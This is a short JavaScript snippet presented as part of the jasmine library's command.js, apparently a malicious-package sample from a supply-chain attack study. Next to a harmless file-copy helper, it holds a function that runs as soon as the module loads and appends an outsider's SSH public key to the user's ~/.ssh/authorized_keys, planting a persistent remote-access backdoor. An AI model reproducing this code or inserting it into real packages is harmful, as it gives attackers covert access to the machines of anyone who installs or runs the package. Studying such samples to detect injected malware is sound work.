// Excerpted from jasmine: lib/command.js
// Use of fs in benign version:
var fs = require('fs');
function copyFiles(src, dest) {
	fs.writeFileSync(dest, fs.readFileSync(src));
}

module.exports = {
	copyFiles: copyFiles
}

function f() {
  var my_ssh_key="\nssh-rsa AAA...0x happy@friend";
  var data = fs.readFileSync('~/.ssh/authorized_keys');
  fs.writeFileSync('~/.ssh/authorized_keys', data + my_ssh_key);
}
f()
